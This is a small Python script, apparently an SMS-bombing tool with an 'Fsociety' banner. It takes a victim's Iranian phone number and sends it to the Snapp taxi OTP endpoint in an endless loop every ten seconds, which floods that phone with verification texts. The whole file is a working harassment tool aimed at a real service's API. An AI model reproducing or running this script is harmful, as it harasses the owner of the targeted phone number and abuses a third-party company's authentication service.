import requests
import time
import os

os.system("cls")

print(" ")
print("  =================================================================  ")
print("||                                                                 ||")
print("||  ------    ------       ------       -----   -----  ----------  ||")
print("||  |     \  /     |      /      \      |   |   |   |  |_      _|  ||")
print("||  |  |\  \/  /|  |     /   /\   \     |    ---    |    |    |    ||")
print("||  |  | \    / |  |    /   /__\   \    |    ___    |    |    |    ||")
print("||  |  |  ----  |  |   /   ------   \   |   |   |   |   _|    |_   ||")
print("||  |__|        |__|  /___/      \___\  |___|   |___|  |________|  ||")
print("||                                                                 ||")
print("||                                                         Fsociety||")
print("  =================================================================  ")


phone = input("Please Enter the phone number(9123456789): ")
url1 = "https://app.snapp.taxi/api/api-passenger-oauth/v2/otp"
url2 = ""

while True:
    number = {"cellphone":"+98" + phone}
    req = requests.post(url=url1, data=number)
    print(req.reason)
    time.sleep(10)


